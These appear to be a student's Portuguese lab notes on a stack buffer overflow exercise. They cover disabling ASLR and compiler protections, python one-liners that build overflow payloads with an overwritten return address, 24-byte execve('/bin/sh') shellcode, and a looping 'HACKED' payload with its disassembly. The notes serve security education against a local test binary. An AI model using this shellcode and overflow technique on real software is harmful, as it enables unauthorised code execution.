Disable randomization
kali@kali:/media/sf_Shared_SegSoft-Kali/Protocolos/3-stack$ cat /proc/sys/kernel/randomize_va_space 
2

0 = disabled
1 = Conservative Randomization
2 = Full Randomization

Stack execution
gcc -D_FORTIFY_SOURCE=0 -W -no-pie -fno-stack-protector -z execstack stack.c -o stack

===============================================================================

loop infinito
python -c 'print "\x90"*8*5 + "\x99\x11\x40\x00\x00\x00\x00\x00"' > badfile
python -c 'print "\x90"*8*5 + "\x99\x11\x40\x00\x00\x00\x00\x00"' > smasher

===============================================================================

SHELLL NO GDB

Inicio do buffer: 0x00007fffffffcdc0

---------------------------------

\x6a\x3b\x58\x99\x52\x48\xbb\x2f -> shellcode
\x2f\x62\x69\x6e\x2f\x73\x68\x53 -> shellcode
\x54\x5f\x52\x57\x54\x5e\x0f\x05 -> shellcode

\xc0\xdf\xff\xff\xff\x7f\x00\x00 -> return (meter a apontar para a shellcode)

\x90\x90\x90\x90\x90\x90\x90\x90 -> ebp(?)

\x90\x90\x90\x90\x90\x90\x90\x90 -> buffer[32]
\x90\x90\x90\x90\x90\x90\x90\x90 -> buffer[32]
\x90\x90\x90\x90\x90\x90\x90\x90 -> buffer[32]
\x90\x90\x90\x90\x90\x90\x90\x90 -> buffer[32]

---------------------------------

Exploit:
	python -c 'print "\x90"*8*5 + "\xd0\xdf\xff\xff\xff\x7f\x00\x00" + "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"' > smasher
	gdb stack
	run
Shell code:
	24 bytes -> char code[] = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05";

===============================================================================

Executar loop sem nada dentro (a: goto a;)
python -c 'print "\x90"*8*5 + "\xd0\xdf\xff\xff\xff\x7f\x00\x00" + "\x55\x48\x89\xe5\x89\x7d\xfc\x48\x89\x75\xf0\xeb\xfe\x90"' > smasher
gdb stack
run

===============================================================================
HACKED

python -c 'print "\x90"*8*5 + "\x90\xdf\xff\xff\xff\x7f\x00\x00" + "A"*88' > smasher

python -c 'print "A"*8*5 + "\x90\xdf\xff\xff\xff\x7f\x00\x00" + "\x55\x48\x89\xe5\x48\x83\xec\x20\x89\x7d\xec\x48\x89\x75\xe0\xc6\x45\xf8\x48\xc6\x45\xf9\x41\xc6\x45\xfa\x43\xc6\x45\xfb\x4b\xc6\x45\xfc\x45\xc6\x45\xfd\x44\xc6\x45\xfe\x0a\xc6\x45\xff\x00\x48\x8d\x45\xf8\x48\xba\x20\xea\xe4\xf7\xff\x7f\x00\x00\x48\x89\xc7\xb8\x00\x00\x00\x00\xff\xd2\xeb\xe6\x0f\x1f\x44\x00\x00"' > smasher
gdb stack
run

(88)
\x55
\x48\x89\xe5
\x48\x83\xec\x20
\x89\x7d\xec
\x48\x89\x75\xe0
\xc6\x45\xf8\x48
\xc6\x45\xf9\x41
\xc6\x45\xfa\x43
\xc6\x45\xfb\x4b
\xc6\x45\xfc\x45
\xc6\x45\xfd\x44
\xc6\x45\xfe\x0a
\xc6\x45\xff\x00
\x48\x8d\x45\xf8
\x48\xba\x20\xea\xe4\xf7\xff
\x7f\x00\x00
\x48\x89\xc7
\xb8\x00\x00\x00\x00
\xff\xd2
\xeb\xe6
\x0f\x1f\x44\x00\x00

0000000000401102 <main>:
  401102:       55                      push   %rbp
  401103:       48 89 e5                mov    %rsp,%rbp
  401106:       48 83 ec 20             sub    $0x20,%rsp
  40110a:       89 7d ec                mov    %edi,-0x14(%rbp)
  40110d:       48 89 75 e0             mov    %rsi,-0x20(%rbp)
  401111:       c6 45 f8 48             movb   $0x48,-0x8(%rbp)
  401115:       c6 45 f9 41             movb   $0x41,-0x7(%rbp)
  401119:       c6 45 fa 43             movb   $0x43,-0x6(%rbp)
  40111d:       c6 45 fb 4b             movb   $0x4b,-0x5(%rbp)
  401121:       c6 45 fc 45             movb   $0x45,-0x4(%rbp)
  401125:       c6 45 fd 44             movb   $0x44,-0x3(%rbp)
  401129:       c6 45 fe 0a             movb   $0xa,-0x2(%rbp)
  40112d:       c6 45 ff 00             movb   $0x0,-0x1(%rbp)
  401131:       48 8d 45 f8             lea    -0x8(%rbp),%rax
  401135:       48 ba 20 ea e4 f7 ff    movabs $0x7ffff7e4ea20,%rdx
  40113c:       7f 00 00 
  40113f:       48 89 c7                mov    %rax,%rdi
  401142:       b8 00 00 00 00          mov    $0x0,%eax
  401147:       ff d2                   callq  *%rdx
  401149:       eb e6                   jmp    401131 <main+0x2f>
  40114b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)


=================================================================================================

python -c 'print "\x90"*8*5 + "\xd0\xdf\xff\xff\xff\x7f\x00\x00" + "<EXECUTA>"' > smasher

